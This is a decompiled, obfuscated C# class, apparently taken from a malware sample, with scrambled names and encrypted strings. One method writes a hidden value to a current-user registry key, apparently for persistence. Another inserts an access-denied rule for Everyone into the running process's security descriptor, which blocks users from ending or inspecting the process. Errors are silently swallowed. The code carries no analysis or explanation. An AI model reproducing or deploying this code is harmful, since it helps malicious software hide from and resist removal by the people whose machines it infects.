using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace PMpBbYpvEb;

internal sealed class UQolrMmPyk
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr vfFGkVLeQhfmgf, int qYElQdfQoxge, [Out] byte[] ORapXiQPwY, uint qMyZQZufBc, out uint zzOSfvSObEWu);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr xzuqeNIouJNKRk, int UQpLtsnlUwaNn, [In] byte[] bYXqRMQoWIwnZ);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void vKoaGyOgRXWde(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(PhxOPeBqRsG.jPRGqhYdKzNWs(PhxOPeBqRsG.xTaQFUIySYvoZ(getString_0(107412413))));
			registryKey.SetValue(PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107411796)), getString_0(107381798));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor jnDfjHRTMbAooid(IntPtr intptr_0)
	{
		byte[] oRapXiQPwY = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, oRapXiQPwY, 0u, out var zzOSfvSObEWu);
		if ((long)zzOSfvSObEWu > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, oRapXiQPwY = new byte[zzOSfvSObEWu], zzOSfvSObEWu, out zzOSfvSObEWu))
		{
			return null;
		}
		return new RawSecurityDescriptor(oRapXiQPwY, 0);
	}

	private void OMjJGdLGoHugiW(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void XEFRTofdocNy()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = jnDfjHRTMbAooid(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			OMjJGdLGoHugiW(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static UQolrMmPyk()
	{
		Strings.CreateGetStringDelegate(typeof(UQolrMmPyk));
	}
}
